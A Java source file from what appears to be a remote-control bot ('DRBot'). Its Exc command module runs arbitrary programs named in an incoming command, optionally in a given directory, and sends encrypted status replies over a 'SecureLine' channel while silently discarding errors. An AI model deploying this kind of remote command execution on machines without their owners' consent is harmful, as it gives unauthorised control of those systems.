package com.DRBot.Commands;

import com.DRBot.SecureLine.SecureLine;
import java.io.PrintWriter;
import java.io.File;
import java.io.IOException;

/**
 *
 * @author MerNat
 * 
 * -- usage ->exc dir/folder code
 * dir/folder = is the directory where the code executes 
 * code = the code to be executed (e.g. notepad).
 */

public class Exc implements Runnable{
    
    private final String[] command;
    private final String[] fullCommand;
    private final String[] codeS;
    private final String code;
    private PrintWriter writer;
    private File myFile;
    private Process ps;
    private ProcessBuilder pB;
    private Thread newExc;
    private SecureLine secureLine;
    
    Exc(String[] command,PrintWriter writer,SecureLine secureLine){
        this.command = command;
        this.secureLine = secureLine;
        this.writer = writer;
        fullCommand = new String[this.command.length-1];
        for(int i = 1;i<this.command.length;i++){
            fullCommand[i-1] = this.command[i];
        }
        if(!fullCommand[0].equals("null")){
        myFile = new File(fullCommand[0].replace("*",":").replace("/","\\\\").replace("_"," "));
        }
        code = fullCommand[1].replace("_"," ").replace("*",":");
        codeS = code.split(" ");
    }
    Exc(String[] command){
        this.command = command;
        fullCommand = new String[command.length-1];
        for(int i = 1;i<command.length;i++){
            fullCommand[i-1] = command[i];
        }
        if(!fullCommand[0].equals("null")){
        myFile = new File(fullCommand[0].replace("*",":").replace("/","\\\\").replace("_"," "));
        }
        code = fullCommand[1].replace("_"," ").replace("*",":");
        codeS = code.split(" ");
        newExc = new Thread(new Runnable(){
            @Override
            public void run(){
                if(fullCommand[0].equals("null")){
        try {
                pB = new ProcessBuilder(codeS);
                ps = pB.start();
                ps.waitFor();
                ps.destroy();
            } catch (IOException ex) {} catch (InterruptedException ex) {}               
        }
     else{
         if(checkFolder(myFile) == true){
            try {
                pB = new ProcessBuilder(codeS);
                pB.directory(myFile);
                ps = pB.start();
                ps.waitFor();
                ps.destroy();
            } catch (IOException ex) {} catch (InterruptedException ex) {}
        }
     }
            }
        });
    }
    public void startExc(){
        newExc.start();
    }
    
    @Override
    public void run(){
        
     if(fullCommand[0].equals("null")){
        try {
            toPrint("[exc] Success");
                pB = new ProcessBuilder(codeS);
                ps = pB.start();
                ps.waitFor();
                ps.destroy();
            } catch (IOException ex) {} catch (InterruptedException ex) {}               
        }
     else{
         if(checkFolder(myFile) == true){
            try {
                toPrint("[exc] Success");
                pB = new ProcessBuilder(codeS);
                pB.directory(myFile);
                ps = pB.start();
                ps.waitFor();
                ps.destroy();
            } catch (IOException ex) {} catch (InterruptedException ex) {}
        }
        else{
            toPrint("[exc] Executing Dir can not be found.");
        }
     }
     }
    
    private void toPrint(String toPrint){
        this.writer.println(secureLine.encrypt(toPrint));
        this.writer.flush();
    }
    private boolean checkFolder(File fileCheck){
        return fileCheck.isDirectory();
    }
}
